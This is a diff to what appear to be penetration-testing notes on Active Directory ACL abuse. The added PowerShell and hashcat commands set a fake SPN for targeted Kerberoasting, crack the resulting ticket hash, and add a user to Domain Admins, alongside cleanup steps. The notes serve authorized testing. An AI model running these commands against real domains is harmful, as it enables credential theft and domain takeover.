@@ -301,9 +301,15 @@ Since we added `<USER-2>` to the `Help Desk Level 1` group, and that group is _M
 ###### Creating a Fake SPN
 ```powershell
 # creds2 = creds for <USER-2>
+$SecPassword = ConvertTo-SecureString ' USER-2 PASSWORD HERE' -AsPlainText -Force
+$Cred2 = New-Object System.Management.Automation.PSCredential('<DOMIAN>\<USER-2', $SecPassword) 
 
 # Creating a Fake SPN
 Set-DomainObject -Credential $Cred2 -Identity <USER-3> -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
+
+# confirm the spn added 
+get-domainuser -Identity <USER-3>
+serviceprincipalname   : notahacker/LEGIT
 ```
 ###### Kerberoasting with Rubeus
 ```powershell
@@ -313,8 +319,9 @@ Set-DomainObject -Credential $Cred2 -Identity <USER-3> -SET @{serviceprincipalna
 ###### Cracking the USER-3 Hash with Hashcat
 ```bash
 hashcat -m 13100 user-3_tgs_hashcat /usr/share/wordlists/rockyou.txt # RC4 hash
+ # AES-128 : -m 19600
 ```
-##  Cleanup
+####  Cleanup
 1. Remove the fake SPN we created on the `<USER-3>` user.
 2. Remove the  `<USER-2>` user from the `Help Desk Level 1` group
 3. Set the password for the  `<USER-2>` user back to its original value (if we know it) or have our client set it/alert the user
@@ -330,6 +337,20 @@ Set-DomainObject -Credential $Cred2 -Identity <USER-3> -Clear serviceprincipalna
 Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members '<USER-2>' -Credential $Cred2 -Verbose
 #  Confirming
 Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq '<USER-2>'} -Verbose
+```
+
+##  modify group membership
+Full control of a group allows you to directly modify group membership of the group. so we can add our selfs to that Group 
+```powershell
+# auth 
+$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
+
+# add memeber to that group
+Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred
+
+# verity hat the user was successfully added to the group
+Get-DomainGroupMember -Identity 'Domain Admins'
 ```
 
 ## Detection and Remediation
